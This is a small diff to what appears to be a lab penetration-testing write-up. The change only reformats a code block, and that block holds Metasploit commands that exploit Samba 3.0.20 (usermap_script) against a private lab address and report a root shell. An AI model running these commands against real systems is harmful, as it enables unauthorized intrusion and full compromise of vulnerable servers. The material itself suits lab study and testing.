@@ -75,11 +75,13 @@ __Target Service__
 samba 3.0.20
 Metasploit exploit:
 
-'''msfconsole
+```bash
+	msfconsole
 	use exploit/multi/samba/usermap_script
 	set RHOSTS 192.168.56.10
 	set RPORT 445
-	exploit '''
+	exploit
+```
 
 Result:
 - Root shell obtain
